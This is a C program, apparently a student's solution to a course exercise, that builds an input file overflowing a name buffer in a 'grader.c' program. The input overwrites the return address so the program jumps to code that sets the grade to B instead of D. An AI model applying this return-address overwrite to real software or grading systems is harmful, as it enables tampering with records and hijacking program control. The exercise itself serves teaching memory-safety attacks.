/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Maxwell Lin and Melody Choi                                */
/*--------------------------------------------------------------------*/

#include <stdio.h>

/*--------------------------------------------------------------------*/

/* Creates a string capable of causes the grader.c program to generate 
   output whose format is indistinguishable from normal output, with 
   the exception that the grade 'D' is changed to 'B'.

   Outputs to file dataB (if file does not exist, creates it). */

int main(void)
{
   FILE *psFile;
   unsigned long ulData;

   ulData = 0x400858; /* address of "grade = 'B';"" in assembly */

   psFile = fopen("dataB", "w");

   /* buf[0-17] */
   fprintf(psFile, "Maxwell and Melody");
   /* buf[18] */
   putc('\0', psFile);
   /* buf[19-47] */
   fprintf(psFile, "fillerfillerfillerfillerfille");
   /* buf[48-55] (main return address) */
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);
   /* buf[56] (newline to end attack) */
   putc('\n', psFile);
   return 0;

   /* The overwritten return value redirects the return of getName
      To the point in assembly just past the branching of the
      name checking function, thus running the grade = 'B' code. */
}